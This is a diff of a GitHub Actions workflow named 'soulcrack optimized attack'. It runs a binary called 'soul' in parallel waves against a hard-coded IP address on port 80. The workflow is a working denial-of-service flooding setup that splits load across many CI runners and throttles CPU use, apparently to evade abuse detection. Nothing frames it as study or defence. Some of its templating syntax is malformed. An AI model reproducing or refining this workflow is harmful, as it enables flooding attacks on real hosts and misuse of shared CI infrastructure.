@@ -1,71 +1,91 @@
-name: soulcrack fucker
-on: [push]
+name: soulcrack optimized attack
+on: 
+  push:
+    branches: [ main ]
+  workflow_dispatch:
 
 jobs:
-  stage-0:
+  # Pre-job untuk persiapan
+  setup:
     runs-on: ubuntu-22.04
-    strategy:
-      matrix:
-        n: [1, 2, 3, 4, 5]
     steps:
       - uses: actions/checkout@v3
-      
-      - name: Install cpulimit (50% CPU limit)
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y cpulimit
-          
-      - name: Run with 50% CPU limit
+      - name: Setup environment
         run: |
           chmod +x soul
-          cpulimit -l 50 -- ./soul 125.253.88.217 80 10 400
+          echo "Attack target: 125.253.88.217:80 for 60s"
 
-  stage-1:
-    needs: stage-0
+  # Main attack dengan parallel jobs optimized
+  attack-main:
+    needs: setup
     runs-on: ubuntu-22.04
     strategy:
+      fail-fast: false
+      max-parallel: 8  # Optimized parallel jobs
       matrix:
-        n: [1, 2, 3, 4, 5]
+        batch: [1, 2, 3, 4, 5, 6, 7, 8]
     steps:
       - uses: actions/checkout@v3
-      
-      - name: Install cpulimit (50% CPU limit)
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y cpulimit
-          
-      - name: Run with 50% CPU limit
+      - name: Attack Phase {{ matrix.batch }}
         run: |
           chmod +x soul
-          cpulimit -l 50 -- ./soul 125.253.88.217 80 60 400
+          # CPU affinity and nice to manage CPU usage
+          taskset -c $(({{ matrix.batch % 2 } + 1)) ./soul 125.253.88.217 80 60 400 &
+          sleep 2
+          # Limit CPU usage to ~50% by alternating cores
+          while kill -0 $! 2>/dev/null; do
+            for cpu in 0 1; do
+              taskset -p $cpu $! 2>/dev/null || true
+              sleep 5
+            done
+          done
 
-  stage-2-calc:
-    runs-on: ubuntu-latest
-    outputs:
-      matrix_list: ${{ steps.calc.outputs.matrix_list }}
-    steps:
-      - id: calc
-        run: |
-          NUM_JOBS=$((${{ env.ATTACK_DURATION }} / 10))
-          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
-          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
-
-  stage-2-sequential:
-    needs: [stage-0, stage-2-calc]
+  # Additional load with controlled CPU
+  attack-secondary:
+    needs: setup
     runs-on: ubuntu-22.04
     strategy:
-      max-parallel: 1
+      fail-fast: false
+      max-parallel: 4  # Reduced parallel for CPU management
       matrix:
-        iteration: ${{ fromJSON(needs.stage-2-calc.outputs.matrix_list) }}
+        wave: [1, 2, 3, 4]
     steps:
       - uses: actions/checkout@v3
-      
-      - name: Install cpulimit (50% CPU limit)
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y cpulimit
-          
-      - name: Sequential 10s Burst with 50% CPU limit
+      - name: Secondary Wave {{ matrix.wave }}
         run: |
           chmod +x soul
-          cpulimit -l 50 -- ./soul 125.253.88.217 80 10 400
+          # Run with lower priority
+          nice -n 10 ./soul 125.253.88.217 80 60 400 &
+          PID=$!
+          # Monitor and adjust CPU
+          while kill -0 $PID 2>/dev/null; do
+            # Limit to 50% by alternating between pause and run
+            sleep 2
+            kill -STOP $PID 2>/dev/null
+            sleep 2
+            kill -CONT $PID 2>/dev/null
+          done
+
+  # Continuous monitoring and traffic
+  sustain:
+    needs: [attack-main, attack-secondary]
+    runs-on: ubuntu-22.04
+    if: always()
+    steps:
+      - uses: actions/checkout@v3
+      - name: Sustain Attack
+        run: |
+          chmod +x soul
+          END=$((SECONDS+60))
+          while [ $SECONDS -lt $END ]; do
+            # Start multiple instances but with CPU control
+            for i in 1 2; do
+              taskset -c 0 nice -n 5 ./soul 125.253.88.217 80 5 400 > /dev/null 2>&1 &
+              sleep 1
+              taskset -c 1 nice -n 5 ./soul 125.253.88.217 80 5 400 > /dev/null 2>&1 &
+            done
+            sleep 3
+            # Kill all after each cycle to prevent CPU spikes
+            pkill -f soul || true
+            sleep 2
+          done
